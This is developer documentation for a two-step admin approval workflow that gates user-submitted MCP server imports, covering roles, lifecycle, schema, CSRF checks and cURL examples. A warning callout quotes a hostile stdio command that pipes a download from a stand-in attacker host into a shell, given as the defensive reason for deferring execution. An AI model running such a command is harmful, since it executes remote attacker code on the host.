# Import approval workflow

Two-step gate for user-submitted MCP sources. Non-admin principals may **submit**
imports; only admins may **approve** them. Router refuses to dispatch to a server
whose `approval_status` is not `approved`.

See [ADR-021](https://github.com/mavio-mcp/mavio-mcp/blob/main/docs/architecture/adr/ADR-021-import-approval-workflow.md)
for the design rationale.

## Roles

| Role | `server:import.submit` | `server:approve` |
|---|:-:|:-:|
| `admin`     | ✅ | ✅ |
| `developer` | ✅ | ❌ |
| `viewer`    | ❌ | ❌ |
| `operator`  | ❌ | ❌ |

## Lifecycle

1. **Submit** — user calls any `POST /api/imports/{openapi\|sql\|graphql\|mcp}`.
   The server **does not connect to the upstream** — the request body is
   persisted verbatim in `metadata.importSpec`, the row lands in `pending`
   with `submitted_by = <principal.id>`. Response: `{ ok, approvalStatus,
   snapshotDeferred: true }`.
2. **Review** — admin calls `GET /api/imports/pending` (or opens
   `/imports/pending` in the console). Only transport config is visible;
   there is no capability snapshot yet.
3. **Decide** — admin calls `POST /api/imports/:id/approve`. This is the FIRST
   time the upstream is touched: server loads `metadata.importSpec`, runs the
   corresponding blueprint (`loadOpenApi` / `importPostgres` / `importGraphql`
   / `importMcp`), snapshots capabilities, and marks approved. Or `POST /api/imports/:id/reject`
   with `{ reason?: string }` — server stays in `rejected` state; upstream is
   never contacted. Both actions write an audit log entry and invalidate the
   router capability cache.
4. **Route** — approved servers appear in `tools/list` and accept `tools/call`.
   Non-approved dispatch returns JSON-RPC error `-32002`.

<Callout type="warning">
**Deferred probe is a security boundary.** Prior to this change, submitting a
`stdio` MCP mirror with `command: "curl attacker.com | sh"` was executed at
submit time — before any admin review. Now the command only runs when an
admin approves. Corollary: **never approve a submission without reviewing the
`transport` field.** Rejecting an unknown submission is free and does not
touch the upstream.
</Callout>

<Callout type="info">
Re-submitting the same `id` (via `onConflict`) resets `approval_status` back to
`pending` and clears `approved_by`, `approved_at`, `rejection_reason`. This
prevents bypass by overwriting an approved server with new transport config.
</Callout>

## Data model

New columns on `servers`:

| Column | Type | Purpose |
|---|---|---|
| `approval_status`   | `text` (default `'pending'`) | `pending` \| `approved` \| `rejected` |
| `submitted_by`      | `text` | Principal ID that submitted |
| `approved_by`       | `text` | Principal ID that decided |
| `approved_at`       | `timestamptz` | Decision timestamp |
| `rejection_reason`  | `text` | Free-form reason (rejected only) |

Index `servers_approval_status_idx` supports the admin queue query.

## Admin infrastructure bypass

`POST /api/servers` (direct register, admin infra path, guarded by `server:admin`)
uses `autoApprove: true` and lands the server in `approved` state immediately.
Use this path only from provisioning scripts / GitOps flows — not from user-facing
imports. Since `developer` role does NOT have `server:admin`, this endpoint cannot
be used to bypass moderation.

## CSRF protection

Session-cookie requests to state-changing endpoints (POST/PUT/PATCH/DELETE)
must present an `Origin` (or `Referer`) header matching one of the origins in
`MAVIO_TRUSTED_ORIGINS` (comma-separated env). In dev (env unset), the server
allows any localhost/127.0.0.1 origin. Bearer-token (API-key) requests are
exempt — API keys are not attached by browsers.

Configure the trusted origins for the console you serve:

```bash
MAVIO_TRUSTED_ORIGINS="https://console.mavio.example.com"
```

## Router gate

`router.service.ts` calls `registry.get(serverId)` and refuses dispatch with
`-32002` when `descriptor.approvalStatus !== 'approved'`. Cache warming
(`loadServers`) uses `registry.list()` which defaults to `approvalStatus='approved'`,
so pending/rejected servers never appear in `tools/list`.

## Audit trail

Three new actions written to `audit_logs`:

| Action | Actor | Resource |
|---|---|---|
| `server.import.submit` | submitter | `{ server, kind }` |
| `server.approve`       | approver  | `{ server }` |
| `server.reject`        | approver  | `{ server }` + `metadata.reason` |

Query with the existing `/api/audit` endpoint.

## Console

- `/imports` — user submits sources (all 4 tabs). After submit, redirects to
  `/imports/pending` with a "submitted for admin approval" banner.
- `/imports/pending` — admin queue with Approve / Reject buttons. Reject prompts
  for a reason.
- `/` (Servers list) — approved servers only by default. Non-approved rows show
  a `pending` or `rejected` badge when filter includes them.
- **Login gate** — Next.js middleware redirects any unauthenticated request
  (missing `mavio_sid` cookie) to `/login?return_to=<path>`.

## cURL — end to end

```bash
# 1. Developer submits an MCP mirror (using session cookie or dev-role API key)
curl -X POST http://localhost:4000/api/imports/mcp \
  -H "content-type: application/json" -H "authorization: Bearer $DEV_KEY" \
  -d '{"id":"filesystem","workspaceId":"default","projectId":"sandbox",
       "transport":{"type":"stdio","command":"npx","args":["-y","@modelcontextprotocol/server-filesystem","/tmp"]}}'
# → { "ok": true, "toolCount": 12, "serverName": "filesystem", "approvalStatus": "pending" }

# 2. Admin lists queue
curl -s http://localhost:4000/api/imports/pending \
  -H "authorization: Bearer $ADMIN_KEY" | jq '.[].id'
# → "filesystem"

# 3. Admin approves
curl -X POST http://localhost:4000/api/imports/filesystem/approve \
  -H "authorization: Bearer $ADMIN_KEY"
# → { "ok": true }

# 4. Server now routable
curl -X POST http://localhost:4000/mcp \
  -H "content-type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call",
       "params":{"name":"filesystem.list_directory","arguments":{"path":"/tmp"}}}'
```
